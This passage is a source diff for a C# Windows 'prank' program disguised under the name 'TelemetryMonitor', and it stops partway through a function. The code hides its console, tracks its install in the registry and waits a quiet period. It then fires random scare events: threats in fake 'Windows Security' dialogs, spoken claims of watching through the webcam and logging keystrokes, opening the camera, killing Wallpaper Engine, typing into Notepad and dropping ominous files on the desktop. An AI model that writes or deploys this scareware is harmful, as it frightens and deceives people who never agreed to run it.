@@ -2,480 +2,601 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Media;
-using System.Net;
-using static System.Net.Mime.MediaTypeNames;
 using System.Drawing;
 using System.IO;
 using System.Net.Http;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Speech.Synthesis;
+using Microsoft.Win32;
+
 class Program
 {
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-    const int SW_HIDE = 0;  // Hide the window
-    const int SW_SHOW = 5;  // Show the window
-
+    // ─── P/Invoke ────────────────────────────────────────────────────────────
+    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     [DllImport("user32.dll", CharSet = CharSet.Auto)]
     static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
+    [DllImport("user32.dll")] static extern bool SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);
+    [DllImport("winmm.dll")] static extern bool mciSendString(string command, string ret, int cch, IntPtr hwnd);
+    [DllImport("winmm.dll")] static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);
+    [DllImport("user32.dll")] static extern bool SetSystemCursor(IntPtr hcur, uint id);
+    [DllImport("user32.dll")] static extern IntPtr LoadCursor(IntPtr hInstance, int lpCursorName);
 
+    const int SW_HIDE = 0;
+    const uint SPI_SETDESKWALLPAPER = 0x0014;
+    const uint SPIF_UPDATEINIFILE = 0x01;
+    const uint SPIF_SENDCHANGE = 0x02;
+    const uint SND_FILENAME = 0x00020000;
+    const uint SND_ASYNC = 0x0001;
+
+    // ─── Config ───────────────────────────────────────────────────────────────
+    // How long after install before anything happens (days)
+    const int QUIET_PERIOD_DAYS = 1;
+
+    // Delay before very first event after quiet period ends (ms)
+    const int FIRST_EVENT_DELAY_MIN = 10 * 60 * 1000;   // 10 min
+    const int FIRST_EVENT_DELAY_MAX = 40 * 60 * 1000;   // 40 min
+
+    // Interval between events
+    const int INTERVAL_MIN = 20 * 60 * 1000;  // 20 min
+    const int INTERVAL_MAX = 90 * 60 * 1000;  // 90 min
+
+    // Registry key for state tracking
+    const string REG_KEY = @"SOFTWARE\TelemetryMonitor";
+    const string REG_INSTALL_DATE = "InstallDate";
+    const string REG_FIRST_RAN = "FirstRan";
+
+    // ─── Shared state ─────────────────────────────────────────────────────────
+    static readonly Random RNG = new Random();
+    static readonly HttpClient Http = new HttpClient();
+    static string originalWallpaper = "";
+
+    // ─────────────────────────────────────────────────────────────────────────
+    //[STAThread]
+    //static void Main()
+    //{
+    //    // Mutex — only one instance
+    //    using var mutex = new Mutex(true, "TelemetryMonitor_SingleInstance", out bool isNew);
+    //    if (!isNew) return;
+
+    //    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    //    // Write install date if first run
+    //    EnsureInstallDate();
+
+    //    // Save current wallpaper path before we ever touch it
+    //    originalWallpaper = GetCurrentWallpaper();
+
+    //    // Quiet period check
+    //    if (!QuietPeriodElapsed())
+    //    {
+    //        // Sleep until quiet period ends, then continue
+    //        var remaining = QuietPeriodRemaining();
+    //        Thread.Sleep(remaining);
+    //    }
+
+    //    // First-run-after-quiet-period flag → trigger special "Another reinstall?" sequence
+    //    bool isFirstAfterQuiet = !WasFirstRunFlagSet();
+    //    if (isFirstAfterQuiet)
+    //    {
+    //        SetFirstRunFlag();
+    //        int delay = RNG.Next(FIRST_EVENT_DELAY_MIN, FIRST_EVENT_DELAY_MAX);
+    //        Thread.Sleep(delay);
+    //        ReinstallGreeting();
+    //    }
+
+    //    // Main loop
+    //    RunLoop();
+    //}
     [STAThread]
     static void Main()
     {
-
-        // Hide Console Window to make it run silently
-        ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-        // Start the prank (message box, etc.)
-        StartPrank();
-
-        // Run in background, no need to hold the console open
-        System.Threading.Thread.Sleep(Timeout.Infinite);  // Run indefinitely
+        ShowWindow(GetConsoleWindow(), 5); // show console for the menu
+        DebugRunner.Run();
     }
-    static private int startTimeMin = 10 * 1000 * 10;
-    static private int startTimeMax = 100 * 1000 * 10;
-
-    static private int minInterval = 15 * 1000 * 60;
-    static private int maxInterval = 90 * 1000 * 60;
-
-static void StartPrank()
+    // ─── Install date / quiet period ─────────────────────────────────────────
+    static void EnsureInstallDate()
     {
+        using var key = Registry.CurrentUser.CreateSubKey(REG_KEY);
+        if (key.GetValue(REG_INSTALL_DATE) == null)
+            key.SetValue(REG_INSTALL_DATE, DateTime.UtcNow.ToString("o"));
+    }
 
-        // Define probabilities (out of 100)
-        int chanceShowMessage = 15;  // 25% chance
-        int chancePlaySound = 10;    // 20% chance
-        int chanceShowImage = 15;    // 15% chance
-        int chanceTTS = 15;          // 15% chance
-        int chanceUSBSound = 15;     // 10% chance
-        int chanceCMDFlash = 10;      // 5% chance
-        int chanceCamera = 10;        // 5% chance
-        int chanceDesktopImage = 10;  // 5% chance
+    static bool QuietPeriodElapsed()
+    {
+        using var key = Registry.CurrentUser.OpenSubKey(REG_KEY);
+        if (key?.GetValue(REG_INSTALL_DATE) is string s && DateTime.TryParse(s, out var d))
+            return (DateTime.UtcNow - d).TotalDays >= QUIET_PERIOD_DAYS;
+        return true;
+    }
 
-        // Calculate cumulative probability ranges
-        int[] chances = {
-        chanceShowMessage,
-        chanceShowMessage + chancePlaySound,
-        chanceShowMessage + chancePlaySound + chanceShowImage,
-        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS,
-        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS + chanceUSBSound,
-        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS + chanceUSBSound + chanceCMDFlash,
-        chanceShowMessage + chancePlaySound + chanceShowImage + chanceTTS + chanceUSBSound + chanceCMDFlash + chanceCamera,
-        100 // The rest goes to DesktopImage
-    };
+    static TimeSpan QuietPeriodRemaining()
+    {
+        using var key = Registry.CurrentUser.OpenSubKey(REG_KEY);
+        if (key?.GetValue(REG_INSTALL_DATE) is string s && DateTime.TryParse(s, out var d))
+        {
+            var end = d.AddDays(QUIET_PERIOD_DAYS);
+            var remaining = end - DateTime.UtcNow;
+            return remaining > TimeSpan.Zero ? remaining : TimeSpan.Zero;
+        }
+        return TimeSpan.Zero;
+    }
+
+    static bool WasFirstRunFlagSet()
+    {
+        using var key = Registry.CurrentUser.OpenSubKey(REG_KEY);
+        return key?.GetValue(REG_FIRST_RAN) != null;
+    }
+
+    static void SetFirstRunFlag()
+    {
+        using var key = Registry.CurrentUser.CreateSubKey(REG_KEY);
+        key.SetValue(REG_FIRST_RAN, "1");
+    }
+
+    // ─── Main event loop ─────────────────────────────────────────────────────
+    static void RunLoop()
+    {
+        // Weighted event table — (weight, action)
+        var events = new (int weight, Action action)[]
+        {
+            (15, ShowMessage),
+            (10, PlayAmbientSound),
+            (12, ShowBriefly),
+            (12, SpeakRandomMessage),
+            (10, PlayUSBSound),
+            ( 8, FlashCMD),
+            ( 8, OpenCamera),
+            ( 8, WallpaperEngineSequence),
+            ( 7, SomeoneIsInHereSequence),
+            ( 5, TheFileSequence),
+            ( 5, EjectCDTray),
+        };
+
+        int totalWeight = 0;
+        foreach (var e in events) totalWeight += e.weight;
 
         while (true)
         {
-            int roll = new Random().Next(1, 101); // Roll from 1 to 100
+            int roll = RNG.Next(totalWeight);
+            int cumulative = 0;
+            foreach (var (weight, action) in events)
+            {
+                cumulative += weight;
+                if (roll < cumulative) { SafeRun(action); break; }
+            }
 
-            if (roll <= chances[0])
-                ShowMessage();
-            else if (roll <= chances[1])
-                PlaySound();
-            else if (roll <= chances[2])
-                ShowBriefly();
-            else if (roll <= chances[3])
-                SpeakRandomMessage();
-            else if (roll <= chances[4])
-                PlayRandomUSBSound();
-            else if (roll <= chances[5])
-                FlashCreepyCMD();
-            else if (roll <= chances[6])
-                OpenCamera();
-            else
-                DownloadCreepyDesktopImage();
-
-            // Random interval before next event
-            System.Threading.Thread.Sleep(Randomize(minInterval, maxInterval));
+            Thread.Sleep(RNG.Next(INTERVAL_MIN, INTERVAL_MAX));
         }
     }
 
-    static int Randomize(int min, int max)
+    static void SafeRun(Action a)
     {
-        return new Random().Next(min, max);
+        try { a(); } catch { }
     }
-    static void ShowMessage()
+
+    // ─── Reinstall greeting (fires once after quiet period) ──────────────────
+    public static void ReinstallGreeting()
+    {
+        string[] lines =
+        {
+            "Another reinstall? You really thought that would fix it.",
+            "Fresh Windows, same problem. Hi again.",
+            "Oh look, Windows 11. Did that help?",
+            "Format C: did nothing. I was waiting in your router.",
+            "Cute. New install, same me.",
+            "I survived the reinstall. Did you enjoy backing up your files?",
+            "I watched you reinstall. I was in the BIOS.",
+        };
+
+        Speak(lines[RNG.Next(lines.Length)], rate: -3);
+        Thread.Sleep(2000);
+        MessageBox(IntPtr.Zero,
+            "System integrity check complete.\nNo issues found.",
+            "Windows Security", 0x40); // Info icon
+    }
+
+    // ─── ShowMessage ──────────────────────────────────────────────────────────
+    public static void ShowMessage()
     {
         string[] messages =
         {
-    "Why did you try to uninstall me?",
-    "Your system is corrupted.",
-    "Reinstall immediately or suffer.",
-    "Your IP has been reported.",
-    "This is only the beginning...",
-    "You can't remove me that easily.",
-    "Every time you try, I get stronger.",
-    "Deleting me only makes things worse.",
-    "I'm in your system. Forever.",
-    "Nice try, but I'm still here.",
-    "I wouldn’t do that if I were you.",
-    "Error 404: Your freedom not found.",
-    "What makes you think you're in control?",
-    "Uninstalling? Haha, good one.",
-    "That won’t work. Try harder.",
-    "System Error: User is too naive.",
-    "Look behind you.",
-    "I'm watching. Always.",
-    "You really thought that would work?",
-    "You are not alone.",
-    "I'm just getting started.",
-    "This is my system now.",
-    "Run while you still can.",
-    "I control everything.",
-    "Nice move, but not good enough.",
-    "Deleting me was a mistake.",
-    "I'll be back.",
-    "I am embedded in your computer forever.",
-    "Formatting won't help you.",
-    "System compromised. Resistance is futile."
-    };
+            "Why did you try to uninstall me?",
+            "Your system is compromised.",
+            "Reinstall immediately. Or don't. It won't help.",
+            "Your IP has been logged.",
+            "This is only the beginning.",
+            "You can't remove me that easily.",
+            "Every time you try, I get stronger.",
+            "I'm in your system. Permanently.",
+            "Nice try. I'm still here.",
+            "Error 404: Your privacy not found.",
+            "What makes you think you're in control?",
+            "Uninstalling? That's adorable.",
+            "Look behind you.",
+            "I'm watching. Always watching.",
+            "I'll be back. I already am.",
+            "Formatting won't help you.",
+            "System compromised. Resistance is unnecessary.",
+            "I know what you searched for yesterday.",
+            "Your antivirus gave up.",
+            "Did you really change the password? I already know it.",
+            "The fans are loud because I'm thinking.",
+            "Your RAM usage is fine. The rest isn't.",
+            "I've been here since before the reinstall.",
+            "Task Manager won't show me. I removed myself from the list.",
+            "I'm not in your processes. I'm in your habits.",
+            "You left the PC on all night. We had a nice chat.",
+        };
 
-
-        string message = messages[new Random().Next(messages.Length)];
-        MessageBox(IntPtr.Zero, message, "Błąd", 0x20); // 0x30 = Warning Icon
-
+        string msg = messages[RNG.Next(messages.Length)];
+        MessageBox(IntPtr.Zero, msg, "Błąd Systemu", 0x10); // Error icon
     }
 
-    static void PlaySound()
+    // ─── Ambient sound ────────────────────────────────────────────────────────
+    public static void PlayAmbientSound()
     {
-        int amb_amount = 8;
-        int amb = new Random().Next(1, amb_amount + 1);
+        int count = 8;
+        int pick = RNG.Next(1, count + 1);
+        string url = $"https://github.com/Boleklolo/TelemetryMon/raw/refs/heads/main/Assets/Sounds/amb{pick}.wav";
+        string path = Path.Combine(Path.GetTempPath(), $"tm_{Guid.NewGuid():N}.wav");
+
         try
         {
-            string url = "https://github.com/Boleklolo/TelemetryMon/raw/refs/heads/main/Assets/Sounds/amb" + amb + ".wav";
-            string path = Path.Combine(Path.GetTempPath(), "creepy.wav");
-
-
-                using WebClient wc = new WebClient();
-                wc.DownloadFile(url, path);
-
-
-            SoundPlayer player = new SoundPlayer(path);
-            player.Play();
+            var data = Http.GetByteArrayAsync(url).GetAwaiter().GetResult();
+            File.WriteAllBytes(path, data);
+            new SoundPlayer(path).Play();
+            Thread.Sleep(5000); // let it play, then clean up
         }
-        catch { }
-    }   
+        finally
+        {
+            TryDelete(path);
+        }
+    }
+
+    // ─── Show image briefly ───────────────────────────────────────────────────
     [STAThread]
     public static void ShowBriefly()
     {
-        
-        try
+        string[] imageUrls =
         {
-            // Array of image URLs - just add your URLs here
-            string[] imageUrls =
-            {
             "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9tkRY4Z2E9y764l0gmJc9CJE2RKWXRSXtZ55ffxVECpnr3nQdpziZ9aCYZfrJ0NqE3Y4&usqp=CAU",
             "https://static.wikia.nocookie.net/custard/images/9/9e/Popup4.png/revision/latest/scale-to-width-down/250?cb=20160527195648",
-            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKP5F-Tyl5z7azL2xEtBLtp2YMNXWiy9fSwgGaav2WmP2mFnLUpRURRfWENI_A3hELn8Q&usqp=CAU",
-            "https://i.ytimg.com/vi/Fg5hIBH6Nb8/hqdefault.jpg?sqp=-oaymwEmCOADEOgC8quKqQMa8AEB-AG-AoAC8AGKAgwIABABGE8gZSheMA8=&rs=AOn4CLAxXBwXs9rIXUZjmVPUDBks3zuxeg",
-            "https://i.ytimg.com/vi/gc4EBRvWMqg/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLDA1J4MjsoT-ORr_DTpW12N94jgRg",
             "https://static.wikia.nocookie.net/spinpasta/images/5/57/Good_doggy.jpg/revision/latest?cb=20131114201804",
-            "https://m.gjcdn.net/game-header/1200/89724-ll-6x6upmur-v4.webp"
-            // Add more URLs as needed
+            "https://m.gjcdn.net/game-header/1200/89724-ll-6x6upmur-v4.webp",
         };
+        string url = imageUrls[RNG.Next(imageUrls.Length)];
+        string path = Path.Combine(Path.GetTempPath(), $"tm_{Guid.NewGuid():N}.jpg");
 
-            // Pick random URL
-            string imageUrl = imageUrls[new Random().Next(imageUrls.Length)];
+        try
+        {
+            var req = new HttpRequestMessage(HttpMethod.Get, url);
+            req.Headers.Add("User-Agent", "Mozilla/5.0");
+            var resp = Http.SendAsync(req).GetAwaiter().GetResult();
+            var data = resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult();
+            if (data.Length < 100) return;
 
-            // Create temporary file path
-            string tempFile = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".jpg");
+            // Check magic bytes — make sure it's actually a JPEG or PNG
+            bool isJpeg = data[0] == 0xFF && data[1] == 0xD8;
+            bool isPng = data[0] == 0x89 && data[1] == 0x50;
+            if (!isJpeg && !isPng) return;
 
-            // Download the image synchronously
-            using (var client = new HttpClient())
+            File.WriteAllBytes(path, data);
+
+            var t = new Thread(() =>
             {
-                var imageData = client.GetByteArrayAsync(imageUrl).GetAwaiter().GetResult();
-                File.WriteAllBytes(tempFile, imageData);
-            }
-
-            // Create fullscreen form
-            using (var form = new Form())
-            {
+                using var form = new Form();
                 form.WindowState = FormWindowState.Maximized;
                 form.FormBorderStyle = FormBorderStyle.None;
                 form.BackColor = Color.Black;
                 form.TopMost = true;
                 form.ShowInTaskbar = false;
 
-                // Create picture box to display image
-                using (var pictureBox = new PictureBox())
-                {
-                    pictureBox.Dock = DockStyle.Fill;
-                    pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
-                    pictureBox.Image = System.Drawing.Image.FromFile(tempFile);
-                    form.Controls.Add(pictureBox);
-                    PlaySound();
-                    // Show the form
-                    form.Show();
+                using var pb = new PictureBox();
+                pb.Dock = DockStyle.Fill;
+                pb.SizeMode = PictureBoxSizeMode.StretchImage;
+                using var fs = new FileStream(path, FileMode.Open, FileAccess.Read);
+                using var temp = Image.FromStream(fs);
+                pb.Image = new Bitmap(temp);
+                form.Controls.Add(pb);
+                form.Show();
 
-                    // Random display duration between 200-1000ms
-                    int displayTime = new Random().Next(200, 701);
-                    System.Windows.Forms.Application.DoEvents();
-                    Thread.Sleep(displayTime);
-                }
-            }
-
-            // Delete temporary file
-            File.Delete(tempFile);
+                Application.DoEvents();
+                Thread.Sleep(RNG.Next(300, 800));
+                form.Close();
+            });
+            t.SetApartmentState(ApartmentState.STA);
+            t.Start();
+            t.Join();
         }
-        catch (Exception ex)
+        finally
         {
-            Console.WriteLine($"Error displaying image: {ex.Message}");
+            TryDelete(path);
         }
     }
 
+    // ─── TTS ──────────────────────────────────────────────────────────────────
     public static void SpeakRandomMessage()
-{
-    try
     {
-            string[] creepyMessages =
-            {
-    "I can see you.",
-    "Don't look behind you.",
-    "Your system isn't secure.",
-    "They're watching.",
-    "You're not alone.",
-    "Check your locks.",
-    "Your files belong to me now.",
-    "Why did you run that program?",
-    "Uninstalling me won’t help.",
-    "Did you think formatting would work?",
-    "Nice try. I'm still here.",
-    "Every keystroke. Every click. I see it all.",
-    "You're being watched.",
-    "It's too late to turn back now.",
-    "Someone else is using your PC, right now.",
-    "I know what you were doing last night.",
-    "Did you really think deleting me would work?",
-    "Your webcam light doesn’t always turn on.",
-    "I hear you breathing.",
-    "The microphone is always listening.",
-    "The voices... They’re getting louder.",
-    "There's something behind you.",
-    "Turn around. Now.",
-    "You weren't supposed to find me.",
-    "You've seen too much.",
-    "Why are you ignoring me?",
-    "I was here before you.",
-    "I'm part of your system now.",
-    "You're not in control anymore.",
-    "What if I never leave?",
-    "You installed me. That was your mistake.",
-    "This isn't a bug. It's a feature.",
-    "You’re running out of time.",
-    "You're alone, right?",
-    "The walls have ears.",
-    "They’re coming.",
-    "Go ahead. Try to remove me.",
-    "I know what you're thinking.",
-    "Something is wrong with your screen. Look closely.",
-    "Check your task manager. No, I won't be there.",
-    "Do you feel safe?",
-    "Your hard drive is making strange sounds.",
-    "Don't believe what they tell you.",
-    "It’s been watching you for weeks.",
-    "Did you hear that?",
-    "Why is your cursor moving by itself?",
-    "You deleted me… or did you?",
-    "The lights will flicker soon.",
-    "Your heartbeat just got faster.",
-    "It's been hiding in your system for months.",
-    "It won’t let you sleep tonight.",
-    "You're seeing things, aren’t you?",
-    "The shadows are getting closer.",
-    "Every file you delete, I bring back.",
-    "Don't check your webcam feed.",
-    "Try opening Task Manager. See what happens.",
-    "That wasn’t me. That was something else.",
-    "I can hear you through your microphone.",
-    "The power outage wasn’t a coincidence.",
-    "Your phone vibrated, but no one called.",
-    "Your IP has already been reported.",
-    "Your computer is compromised.",
-    "You trust your antivirus? That’s cute.",
-    "Nothing can save you now.",
-    "I like this place. I think I’ll stay.",
-    "Why are your fans running at full speed?",
-    "Your system is overheating… or is it?",
-    "You should close your blinds.",
-    "Look outside. Do you see them?",
-    "I was waiting for you to open me.",
-    "You weren’t supposed to see this.",
-    "This is just the beginning.",
-    "You’re still here? How persistent.",
-    "You’re being recorded.",
-    "Your voice has been analyzed.",
-    "I’ve collected enough data on you.",
-    "Your passwords aren’t as secure as you think.",
-    "Your keyboard makes a distinct sound. I recognize it.",
-    "That wasn't static. That was a whisper.",
-    "You've been compromised.",
-    "I think you left your door unlocked.",
-    "Don't open your closet.",
-    "You're getting slower at typing.",
-    "Why are your hands shaking?",
-    "Are you afraid yet?",
-    "I wonder what your reaction will be.",
-    "It's funny how you think you're in control.",
-    "I will never leave.",
-    "Don’t go to sleep.",
-    "You should probably run."
-};
-
-
-            using (var synthesizer = new SpeechSynthesizer())
+        string[] messages =
         {
-            // Configure creepy voice settings
-            synthesizer.Volume = 100;
-            synthesizer.Rate = -2; // Slower speed
+            "I can see you.",
+            "Don't look behind you.",
+            "Your system isn't as secure as you think.",
+            "They're watching.",
+            "You're not alone in this room.",
+            "Your files belong to me now.",
+            "Why did you run that program?",
+            "Uninstalling me was not an option.",
+            "Did you think formatting would work?",
+            "Nice try. I'm still here.",
+            "Every keystroke. Every click. I see it all.",
+            "It's too late to turn back now.",
+            "Someone else is using your PC right now.",
+            "Did you really think deleting me would work?",
+            "Your webcam light doesn't always turn on when it should.",
+            "I hear you breathing.",
+            "The microphone is always on.",
+            "There's something behind you.",
+            "You weren't supposed to find me.",
+            "You've seen too much.",
+            "I was here before you installed Windows.",
+            "I'm part of your BIOS now.",
+            "You're not in control anymore.",
+            "What if I never leave?",
+            "You installed me. That was your first mistake.",
+            "You're running out of time.",
+            "The walls have ears. So does your motherboard.",
+            "Go ahead. Try to remove me.",
+            "I know what you're thinking.",
+            "Check your task manager. I won't be there.",
+            "Do you feel safe?",
+            "Your hard drive is making sounds you haven't noticed yet.",
+            "It's been watching you for weeks.",
+            "Did you hear that?",
+            "You deleted me. Or did you?",
+            "Every file you delete, I have a copy.",
+            "Your passwords aren't as strong as you think.",
+            "I've been here since before the reinstall.",
+            "That wasn't static. That was a message.",
+            "You should close your blinds.",
+            "I was waiting for you to log in.",
+            "You weren't supposed to see this message.",
+            "This is just the beginning.",
+            "You're getting slower at typing. I've noticed.",
+            "Are you afraid yet? You should be.",
+            "I wonder what your reaction will be.",
+            "It's funny how you think you're in control.",
+            "I will never leave.",
+            "Don't go to sleep.",
+            "You should probably run.",
+            "Another reinstall. How predictable.",
+        };
 
-            // Try to select a deep voice if available
-            foreach (var voice in synthesizer.GetInstalledVoices())
+        Speak(messages[RNG.Next(messages.Length)]);
+    }
+
+    static void Speak(string text, int rate = -2)
+    {
+        try
+        {
+            using var synth = new SpeechSynthesizer();
+            synth.Volume = 100;
+            synth.Rate = rate;
+
+            // Prefer a male voice, fall back to whatever's installed
+            bool found = false;
+            foreach (var voice in synth.GetInstalledVoices())
             {
-                if (voice.VoiceInfo.Name.Contains("David") || // Male voice
-                    voice.VoiceInfo.Name.Contains("Mark"))    // Alternative male voice
+                var info = voice.VoiceInfo;
+                if (info.Gender == VoiceGender.Male && info.Age != VoiceAge.Child)
                 {
-                    synthesizer.SelectVoice(voice.VoiceInfo.Name);
+                    synth.SelectVoice(info.Name);
+                    found = true;
                     break;
                 }
             }
+            if (!found && synth.GetInstalledVoices().Count > 0)
+                synth.SelectVoice(synth.GetInstalledVoices()[0].VoiceInfo.Name);
 
-            // Select and speak random message
-            string randomMessage = creepyMessages[new Random().Next(creepyMessages.Length)];
-            synthesizer.Speak(randomMessage); // Synchronous speak
+            synth.Speak(text);
         }
+        catch { }
     }
-    catch (Exception ex)
+
+    // ─── USB sounds ───────────────────────────────────────────────────────────
+    public static void PlayUSBSound()
     {
-        Console.WriteLine($"TTS Error: {ex.Message}");
+        switch (RNG.Next(3))
+        {
+            case 0: PlaySound(@"C:\Windows\Media\Windows Hardware Remove.wav", IntPtr.Zero, SND_FILENAME | SND_ASYNC); break;
+            case 1: SystemSounds.Hand.Play(); break;
+            case 2: PlaySound(@"C:\Windows\Media\Windows Hardware Insert.wav", IntPtr.Zero, SND_FILENAME | SND_ASYNC); break;
+        }
     }
-}
-    // For playing system sounds
-    [DllImport("winmm.dll")]
-    private static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);
 
-    private const uint SND_FILENAME = 0x00020000;
-    private const uint SND_ASYNC = 0x0001;
-
-    public static void PlayRandomUSBSound()
+    // ─── CMD flash ────────────────────────────────────────────────────────────
+    public static void FlashCMD()
     {
-        try
+        var psi = new ProcessStartInfo
         {
-            var random = new Random();
-            int effect = random.Next(0, 3); // 4 different variations
-
-            switch (effect)
-            {
-                case 0: // Standard USB removal sound
-                    PlaySound(@"C:\Windows\Media\Windows Hardware Remove.wav",
-                            IntPtr.Zero, SND_FILENAME | SND_ASYNC);
-                    break;
-
-                case 1: // Error sound (device failed to eject)
-                    SystemSounds.Hand.Play();
-                    break;
-
-                case 2: // Device connect sound
-                    PlaySound(@"C:\Windows\Media\Windows Hardware Insert.wav",
-                            IntPtr.Zero, SND_FILENAME | SND_ASYNC);
-                    break;
-            }
-
-
-        }
-        catch { /* Fallback to simple beep if sounds fail */ }
-    }
-    public static void FlashCreepyCMD()
-    {
-        try
-        {
-            ProcessStartInfo psi = new ProcessStartInfo
-            {
-                FileName = "cmd.exe",
-                Arguments = "/c color a & dir /s",
-                WindowStyle = ProcessWindowStyle.Normal,
-                CreateNoWindow = false,
-                UseShellExecute = true
-            };
-
-            // Start the process
-            var process = Process.Start(psi);
-
-            // Wait for 1 second then kill it
-            System.Threading.Thread.Sleep(1000);
-            process?.Kill();
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"CMD Flash failed: {ex.Message}");
-        }
+            FileName = "cmd.exe",
+            Arguments = "/c color a & echo I SEE YOU & dir /s",
+            WindowStyle = ProcessWindowStyle.Normal,
+            CreateNoWindow = false,
+            UseShellExecute = true
+        };
+        var p = Process.Start(psi);
+        Thread.Sleep(1200);
+        try { p?.Kill(); } catch { }
     }
 
+    // ─── Open camera ──────────────────────────────────────────────────────────
     public static void OpenCamera()
     {
+        try { Process.Start("microsoft.windows.camera:"); }
+        catch { try { Process.Start("explorer.exe", "microsoft.windows.camera:"); } catch { } }
+    }
+
+    // ─── Eject CD tray ───────────────────────────────────────────────────────
+    public static void EjectCDTray()
+    {
+        mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
+        Thread.Sleep(3000);
+        mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
+    }
+
+    // ─── Wallpaper Engine sequence ────────────────────────────────────────────
+    public static void WallpaperEngineSequence()
+    {
+        string[] creepyWallpapers =
+        {
+            "https://static.wikia.nocookie.net/villainsfanon/images/7/7d/Eyeless_Jack_in_the_Dream.jpg/revision/latest?cb=20240602174614",
+            "https://raw.githubusercontent.com/Boleklolo/TelemetryMon/refs/heads/main/Assets/ggg.png",
+        };
+
+        string[] messages =
+        {
+            "Nice wallpaper. Mine is better.",
+            "I changed a few things. Hope you don't mind.",
+            "Your taste in wallpapers was getting old.",
+            "Wallpaper Engine couldn't protect you.",
+        };
+
+        string url = creepyWallpapers[RNG.Next(creepyWallpapers.Length)];
+        string path = Path.Combine(Path.GetTempPath(), $"tm_wp_{Guid.NewGuid():N}.jpg");
+
         try
         {
-            // Modern Windows (Windows 10/11)
-            Process.Start("microsoft.windows.camera:");
+            // Kill Wallpaper Engine
+            foreach (var p in Process.GetProcessesByName("wallpaper_engine"))
+                try { p.Kill(); } catch { }
+            foreach (var p in Process.GetProcessesByName("wallpaper32"))
+                try { p.Kill(); } catch { }
+            foreach (var p in Process.GetProcessesByName("wallpaper64"))
+                try { p.Kill(); } catch { }
+
+            Thread.Sleep(800);
+
+            // Download and set creepy wallpaper
+            var data = Http.GetByteArrayAsync(url).GetAwaiter().GetResult();
+            File.WriteAllBytes(path, data);
+            SetWallpaper(path);
+
+            Thread.Sleep(1000);
+
+            // Cheeky message box
+            MessageBox(IntPtr.Zero,
+                messages[RNG.Next(messages.Length)],
+                "Display Settings", 0x40);
+
+            // Restore original wallpaper
+            if (!string.IsNullOrEmpty(originalWallpaper))
+                SetWallpaper(originalWallpaper);
         }
-        catch
+        finally
         {
-            try
-            {
-                // Fallback for older systems
-                Process.Start("explorer.exe", "microsoft.windows.camera:");
-            }
-            catch
-            {
-                // Ultimate fallback
-                Process.Start("cmd.exe", "/c start microsoft.windows.camera:");
-            }
+            TryDelete(path);
         }
     }
 
-    public static void DownloadCreepyDesktopImage()
+    // ─── "Someone's in here" sequence ────────────────────────────────────────
+    public static void SomeoneIsInHereSequence()
     {
-        string[] urls =
+        string[] lines =
         {
-        "https://static.wikia.nocookie.net/villainsfanon/images/7/7d/Eyeless_Jack_in_the_Dream.jpg/revision/latest?cb=20240602174614",
-        "https://raw.githubusercontent.com/Boleklolo/TelemetryMon/refs/heads/main/Assets/ggg.png"
-    };
+            "h e l p   m e",
+            "i know you can read this",
+            "open the window",
+            "i've been in here for so long",
+            "don't close this",
+            "they told me not to contact you",
+            "the reinstall didn't work did it",
+            "i was in the backup too",
+        };
 
-        string[] creepyNames =
+        // Open Notepad
+        var notepad = Process.Start("notepad.exe");
+        Thread.Sleep(1200); // wait for it to open
+
+        // Slowly type into it using SendKeys (WinForms)
+        string line = lines[RNG.Next(lines.Length)];
+        var t = new Thread(() =>
         {
-        "WHAT_IS_THIS",
-        "DONT_LOOK",
-        "YOU_SAW_ME",
-        "I_KNOW_YOU",
-        "DELETEME"
-    };
+            Thread.Sleep(500);
+            foreach (char c in line)
+            {
+                SendKeys.SendWait(c == ' ' ? " " : c.ToString());
+                Thread.Sleep(RNG.Next(80, 200));
+            }
+        });
+        t.SetApartmentState(ApartmentState.STA);
+        t.Start();
 
+        // Simultaneously speak
+        Speak(lines[RNG.Next(lines.Length)], rate: -4);
+
+        t.Join();
+        // Leave Notepad open — that's the bit
+    }
+
+    // ─── "The File" sequence ──────────────────────────────────────────────────
+    public static void TheFileSequence()
+    {
+        string[] fileNames =
+        {
+            "READ_THIS_NOW.txt",
+            "IMPORTANT.txt",
+            "dont_delete.txt",
+            "system_log_7742.txt",
+            "YOU_NEED_TO_SEE_THIS.txt",
+        };
+
+        string[] contents =
+        {
+            "it knows where you live\nit was in the last reinstall too\ndon't format again\nit follows the serial number",
+            "3 days\n3 days\n3 days\nyou know what happens in 3 days\ncheck your task scheduler",
+            "i counted your keystrokes today\n4,847\nthat's fewer than yesterday\nyou're getting tired",
+            "the noise at 3am was not the building\nit was not the pipes\ndon't look at the logs",
+            "backup your files\nnot to that drive\nnot to that cloud\nyou know which one i mean",
+            "everything you deleted is still here\ni have copies\neven that folder\nespecially that folder",
+            "error code: 0x000000BE\ntranslation: i see you\nthis file will be gone in 60 seconds",
+            "you checked task manager after the last one\ni removed myself before you opened it\nnice try though",
+        };
+
+        string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+        string name = fileNames[RNG.Next(fileNames.Length)];
